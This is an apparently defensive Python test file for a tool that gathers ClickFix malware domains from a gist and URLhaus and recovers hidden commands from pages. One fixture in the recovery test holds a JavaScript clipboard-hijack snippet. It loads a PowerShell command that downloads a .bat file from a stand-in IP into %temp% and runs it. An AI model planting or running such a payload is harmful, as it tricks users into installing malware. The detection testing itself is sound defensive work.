"""Offline tests for livefeeds (gist/URLhaus parsing + static recovery).

Network (requests) and the per-page fetch are monkeypatched, so no feed or host
is contacted. Covers gist domain parsing, URLhaus tag filtering, linked-JS
concatenation, and end-to-end static command recovery."""
import os
import sys
import types
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "clickfix"))

import livefeeds as lf  # noqa: E402


class _Resp:
    def __init__(self, status=200, json_data=None, text="", raw_bytes=b""):
        self.status_code = status
        self._json = json_data or {}
        self.text = text
        self.raw = types.SimpleNamespace(read=lambda n, decode_content=True: raw_bytes)

    def json(self):
        return self._json

    def close(self):
        pass


class GistTest(unittest.TestCase):
    def setUp(self):
        self._orig = lf.requests.get

    def tearDown(self):
        lf.requests.get = self._orig

    def test_parses_domain_list_from_api(self):
        gist_json = {"files": {"clickfix_domains.txt": {
            "content": "evil-one.live\n# a comment\nwww.evil-two.com\nnot a domain line\nevil-one.live\n",
            "truncated": False}}}
        lf.requests.get = lambda url, **kw: _Resp(json_data=gist_json)
        doms = lf.fetch_clickfix_gist()
        self.assertEqual(doms, ["evil-one.live", "www.evil-two.com"])  # deduped, comment+prose skipped

    def test_api_failure_returns_empty(self):
        lf.requests.get = lambda url, **kw: _Resp(status=404)
        self.assertEqual(lf.fetch_clickfix_gist(), [])


class UrlhausTest(unittest.TestCase):
    def setUp(self):
        self._orig_get = lf.requests.get
        self._orig_post = lf.requests.post
        # tests must be deterministic regardless of a real key in the environment
        self._saved_env = {k: os.environ.pop(k, None) for k in ("URLHAUS_AUTH_KEY", "URLHAUS_API_KEY")}

    def tearDown(self):
        lf.requests.get = self._orig_get
        lf.requests.post = self._orig_post
        for k, v in self._saved_env.items():
            if v is not None:
                os.environ[k] = v

    def test_csv_path_keeps_only_clickfix_tagged_online_urls(self):
        # no key in env -> CSV fallback, filtered to ClickFix-tagged rows
        csv = (
            '# comment line\n'
            '"1","2026-10-25","https://evil.live/x","online","2026-10-25","exe","clickfix,FakeCaptcha","l","r"\n'
            '"2","2026-10-25","https://benign.example/y","online","2026-10-25","exe","emotet","l","r"\n'
        )
        lf.requests.get = lambda url, **kw: _Resp(raw_bytes=csv.encode())
        urls = lf.fetch_urlhaus_online()
        self.assertIn("https://evil.live/x", urls)
        self.assertNotIn("https://benign.example/y", urls)

    def test_api_path_used_when_key_set_returns_online_only(self):
        # key in env -> authenticated tag API; keep only url_status=='online', deduped
        os.environ["URLHAUS_AUTH_KEY"] = "testkey"
        resp = _Resp(json_data={"query_status": "ok", "urls": [
            {"url": "https://live.win/a", "url_status": "online"},
            {"url": "https://dead.win/b", "url_status": "offline"},
            {"url": "https://live.win/a", "url_status": "online"},  # dup
        ]})
        calls = []
        lf.requests.post = lambda url, **kw: (calls.append(kw.get("data", {}).get("tag")), resp)[1]
        urls = lf.fetch_urlhaus_online()
        self.assertIn("https://live.win/a", urls)
        self.assertNotIn("https://dead.win/b", urls)     # offline dropped
        self.assertEqual(urls.count("https://live.win/a"), 1)  # deduped
        self.assertTrue(calls)                            # queried the tag API


class RecoverTest(unittest.TestCase):
    def setUp(self):
        self._orig_fetch = lf._fetch

    def tearDown(self):
        lf._fetch = self._orig_fetch

    def test_recovers_command_from_page(self):
        page = ('<html><body><script src="/app.js"></script></body></html>')
        js = ('const command = `powershell -c "Invoke-WebRequest -Uri '
              '\'http://1.2.3.4/d.bat\' -OutFile \\"%temp%\\d.bat\\"; Start-Process \\"%temp%\\d.bat\\""`;'
              "document.addEventListener('copy', e => e.clipboardData.setData('text/plain', command));")

        def fake_fetch(url, timeout=12, max_bytes=1_500_000):
            return js if url.endswith("/app.js") else page
        lf._fetch = fake_fetch
        res = lf.recover_from_url("https://evil.live/")
        self.assertIsNotNone(res["command"])
        self.assertIn("Invoke-WebRequest", res["command"])
        self.assertIn("d.bat", res["command"])          # full command, not truncated at the inner quote

    def test_benign_page_recovers_nothing(self):
        lf._fetch = lambda url, timeout=12, max_bytes=1_500_000: "<html><h1>hello</h1></html>"
        res = lf.recover_from_url("https://legit.example/")
        self.assertIsNone(res["command"])


if __name__ == "__main__":
    unittest.main()
